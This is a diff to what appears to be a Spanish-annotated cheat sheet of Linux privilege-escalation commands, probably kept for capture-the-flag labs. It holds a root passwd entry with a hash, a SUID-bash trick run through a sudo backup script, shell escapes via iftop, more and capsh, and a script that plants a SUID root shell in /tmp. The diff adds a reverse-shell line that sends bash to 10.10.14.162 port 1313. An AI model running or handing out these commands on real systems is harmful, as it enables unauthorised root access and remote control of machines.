@@ -8,6 +8,8 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 # bash privesc
 sudo /etc/mp3backups/backup.sh -c "chmod u+s /bin/bash"
 sudo bash -p
+bash -i &> /dev/tcp/10.10.14.162/1313 0>&1
+
 
 # suid - escalada de privilegios
 sudo /usr/sbin/iftop -->!sh
@@ -23,7 +25,7 @@ TERM=sudo more /etc/profile --> !sh
 /usr/bin/capsh --uid=0 --gid=0 -- -c '/bin/bash'
 
 # script para escalar privilegios en bash
-!/bin/bash
+#!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +xs /tmp/rootbash
 /tmp/rootbash -p
